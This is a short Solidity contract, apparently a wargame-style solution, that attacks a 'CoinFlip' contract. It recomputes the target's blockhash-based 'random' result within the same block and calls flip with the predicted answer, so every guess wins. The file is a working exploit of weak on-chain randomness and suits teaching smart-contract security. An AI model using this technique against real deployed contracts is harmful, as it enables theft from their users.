// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    uint256 private lastHash;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Using the CoinFlip already deployed at the specific address;
        CoinFlip targetCoinFlip = CoinFlip(contractAddress);
        // Meaning that the block.number should always be the same and
        // Therefore we can predict the value of coinFlip
        uint256 blockValue = uint256(blockhash(block.number - 1));
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        // Colling the public flip function should therefore always return true
        targetCoinFlip.flip(side);
    }
}
